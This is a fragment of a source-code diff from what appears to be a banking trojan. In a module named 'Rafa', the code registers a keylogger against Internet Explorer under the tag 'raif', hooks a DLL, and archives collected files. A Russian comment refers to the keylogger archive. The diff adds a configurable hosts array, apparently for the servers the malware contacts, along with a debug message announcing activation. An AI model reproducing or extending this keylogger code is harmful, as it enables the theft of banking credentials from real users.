@@ -5,9 +5,17 @@
 #include "Splice.h"
 #include "rafa.h"
 
+static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
+
 #include "RafaDll.cpp"
 
 namespace Rafa {
+
+	PCHAR Hosts()
+	{
+		return RAFA_HOSTS;
+    }
+
 
 	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
 		// Добавляем директорию в архив кейлогера
@@ -29,6 +37,7 @@ namespace Rafa {
 
 	void CopyRafaKeyFiles(LPVOID Sender)
 	{
+		DBGRAFA( "Rafa", "Активирована" );
 
 #ifdef RafaDllModule
 		InitHook_FilialRConDll();
@@ -43,7 +52,7 @@ namespace Rafa {
 	{
 		PKeyLogSystem S;
 
-		 S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
+		S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
 		if (S != NULL)
 		{
 			char RafaCaption[] = {
